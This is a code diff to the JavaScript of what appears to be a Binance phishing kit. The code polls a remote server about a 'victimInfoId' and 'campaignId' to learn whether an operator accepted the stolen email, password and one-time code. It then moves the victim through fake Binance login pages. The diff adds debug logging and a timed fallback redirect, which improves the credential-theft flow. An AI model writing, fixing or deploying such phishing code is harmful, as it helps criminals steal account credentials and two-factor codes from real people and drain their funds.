@@ -596,8 +596,13 @@
 
         function pollForApproval(victimInfoId, campaignId, step) {
             const pollUrl = `https://emailgrid.onrender.com/status/${victimInfoId}/?step=${step}`;
+            console.log('Starting polling with URL:', pollUrl);
+            console.log('Victim Info ID:', victimInfoId);
+            console.log('Campaign ID:', campaignId);
+            console.log('Step:', step);
             
             const poll = () => {
+                console.log('Polling...');
                 fetch(pollUrl, {
                     method: 'GET',
                     headers: {
@@ -609,8 +614,11 @@
                 .then(response => response.json())
                 .then(result => {
                     console.log('Poll result:', result);
+                    console.log('Submission status:', result.submission_status);
+                    console.log('Step:', step);
                     
                     if (result.submission_status === 'approved') {
+                        console.log('Status approved! Redirecting...');
                         // Hide loading and proceed to next step IMMEDIATELY
                         hideLoading();
                         setDataExpiration();
@@ -625,6 +633,7 @@
                             window.location.href = 'binance.html';
                         }
                     } else if (result.submission_status === 'rejected') {
+                        console.log('Status rejected! Showing error...');
                         // Hide loading and show error
                         hideLoading();
                         let errorMsg = 'Incorrect input. Please try again.';
@@ -633,19 +642,36 @@
                         else if (step === 'otp') errorMsg = result.error_message || 'Invalid OTP. Please try again.';
                         showError(errorMsg);
                     } else {
+                        console.log('Status still pending. Current status:', result.submission_status);
                         // Still pending, continue polling
                         setTimeout(poll, 2000); // Poll every 2 seconds
                     }
                 })
                 .catch(error => {
                     console.error('Polling error:', error);
-                    // Continue polling on error
+                    // Continue polling on error, but limit retries
                     setTimeout(poll, 3000);
                 });
             };
             
             // Start polling
             poll();
+            
+            // Add a fallback timeout after 30 seconds in case polling gets stuck
+            setTimeout(() => {
+                console.log('Polling timeout reached, proceeding anyway...');
+                hideLoading();
+                setDataExpiration();
+                if (step === 'email') {
+                    window.location.href = 'binance-password.html';
+                } else if (step === 'password') {
+                    window.location.href = 'binance-otp.html';
+                } else if (step === 'otp') {
+                    window.location.href = 'binance-verification.html';
+                } else {
+                    window.location.href = 'binance.html';
+                }
+            }, 30000); // 30 second timeout
         }
 
         function showLoading(button) {
